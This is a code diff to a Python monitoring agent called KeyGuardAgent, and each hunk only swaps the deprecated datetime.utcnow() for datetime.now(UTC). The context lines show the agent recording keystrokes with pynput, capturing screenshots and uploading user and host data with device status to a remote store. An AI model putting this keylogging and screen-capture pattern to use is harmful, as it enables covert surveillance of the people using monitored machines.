@@ -12,7 +12,7 @@ import psutil
 import time
 import hashlib
 import os
-from datetime import datetime
+from datetime import datetime, UTC
 from PIL import ImageGrab
 from pynput import keyboard
 import threading
@@ -199,7 +199,7 @@ class KeyGuardAgent:
                 'disk_total_gb': round(disk.total / (1024**3), 2),
                 'disk_used_gb': round(disk.used / (1024**3), 2),
                 'disk_percent': disk.percent,
-                'timestamp': datetime.utcnow().isoformat() + 'Z'
+                'timestamp': datetime.now(UTC).isoformat() + 'Z'
             }
         except Exception as e:
             logger.error(f"Error collecting system info: {e}")
@@ -211,7 +211,7 @@ class KeyGuardAgent:
             return
         
         try:
-            timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
+            timestamp = datetime.now(UTC).strftime('%Y%m%d_%H%M%S')
             filename = f"{self.device_id}_screenshot_{timestamp}.png"
             local_path = self.cache_dir / filename
             
@@ -266,7 +266,7 @@ class KeyGuardAgent:
             # Add to buffer
             self.keylog_buffer.append({
                 'key': key_str,
-                'timestamp': datetime.utcnow().isoformat(),
+                'timestamp': datetime.now(UTC).isoformat(),
                 'device_id': self.device_id
             })
             
@@ -284,7 +284,7 @@ class KeyGuardAgent:
         
         try:
             # Create batch
-            timestamp = datetime.utcnow().isoformat()
+            timestamp = datetime.now(UTC).isoformat()
             log_entry = {
                 'log_id': f"{self.device_id}_{int(time.time())}",
                 'device_id': self.device_id,
@@ -313,7 +313,7 @@ class KeyGuardAgent:
                 'log_id': f"{self.device_id}_{int(time.time() * 1000)}",
                 'device_id': self.device_id,
                 'user': getpass.getuser(),
-                'timestamp': datetime.utcnow().isoformat() + 'Z',
+                'timestamp': datetime.now(UTC).isoformat() + 'Z',
                 'type': activity_type,
                 'data': json.dumps(data)
             }
@@ -334,7 +334,7 @@ class KeyGuardAgent:
                         'device_id': self.device_id,
                         'severity': severity,
                         'message': message,
-                        'timestamp': datetime.utcnow().isoformat()
+                        'timestamp': datetime.now(UTC).isoformat()
                     })
                 )
                 logger.info(f"Alert sent: {message}")
@@ -351,7 +351,7 @@ class KeyGuardAgent:
                 'hostname': system_info.get('hostname', 'Unknown'),
                 'user': system_info.get('user', 'Unknown'),
                 'os': system_info.get('os', 'Unknown'),
-                'last_seen': datetime.utcnow().isoformat() + 'Z',
+                'last_seen': datetime.now(UTC).isoformat() + 'Z',
                 'status': 'online',
                 'agent_version': self.config.AGENT_VERSION,
                 'system_info': json.dumps(system_info)
@@ -469,7 +469,7 @@ class KeyGuardAgent:
                 ExpressionAttributeNames={'#status': 'status'},
                 ExpressionAttributeValues={
                     ':status': 'offline',
-                    ':timestamp': datetime.utcnow().isoformat()
+                    ':timestamp': datetime.now(UTC).isoformat()
                 }
             )
         except Exception as e:
